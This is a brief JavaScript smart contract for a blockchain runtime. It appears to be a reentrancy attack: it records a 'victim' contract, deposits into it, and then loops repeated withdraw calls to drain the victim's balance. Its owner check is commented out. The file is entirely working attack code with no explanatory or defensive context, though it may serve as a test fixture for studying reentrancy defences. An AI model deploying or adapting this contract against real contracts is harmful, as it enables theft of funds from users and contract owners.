"use strict";
function init(victim) {
    Chain.store("victim", victim);
    Chain.store("owner", Chain.msg.sender);
    Chain.store("loopCount", "2");
    return;
}

function main(input) {
    let _input = JSON.parse(input);
    let victim = Chain.load("victim");
    if (_input.method) {
        switch (_input.method) {
            case "deposit":
                Chain.contractCall(victim, true, Utils.int64Sub(Chain.getBalance(Chain.thisAddress), "10000000"), '{ "method": "deposit" }');
                return;
            // case "updateLoopCount":
            //     Chain.store("loopCount", _input.loopCount);
            //     return;
        }
    }
    // Utils.assert(Chain.load("owner") === Chain.msg.initiator, "only owner");
    let loopCount = Number(Chain.load("loopCount"));
    Chain.tlog("count", loopCount);
    if (loopCount > 0) {
        let victimGas = Chain.getBalance(victim);
        let remainBalance = Chain.getAccountMetadata(victim, `blk_${Chain.thisAddress}`);
        if (Utils.int64Compare(victimGas, "10000000") === 1) {
            Chain.store("loopCount", String(loopCount - 1));
            if (Utils.int64Compare(victimGas, remainBalance) === 1) {
                Chain.contractCall(victim, true, "0", `{ "method": "withdraw", "param": { "amount": "${remainBalance}" } }`);
            } else {
                Chain.contractCall(victim, true, "0", `{ "method": "withdraw", "param": { "amount": "${Utils.int64Sub(victimGas, "10000000")}" } }`);
            }
        }
    }
}

function query(input) {
    return input;
}
